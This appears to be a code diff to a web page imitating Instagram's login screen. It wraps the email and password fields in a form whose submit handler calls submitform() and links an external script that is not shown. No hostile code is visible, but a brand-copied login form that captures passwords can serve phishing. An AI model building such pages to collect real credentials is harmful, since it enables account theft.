@@ -15,10 +15,13 @@
 
 <div class="upper">
 <h1>instagram</h1>
-<input type="email" placeholder="please enter you email">
-<input type="password" placeholder="please enter you password">
+
+<form onsubmit="submitform()">
+<input id="email" required type="email" placeholder="please enter you email">
+<input id="pass" required type="password" placeholder="please enter you password">
 <span class="forgotpass">Forgot password?</span>
-<button class="login">Log in</button>
+<button type="submit" id="change" class="login">Log in</button>
+</form>
 
 <span class="linecont"> 
     <span class="line"></span>
@@ -60,4 +63,5 @@
 
 
 </body>
+<script src="/script.js"></script>
 </html>
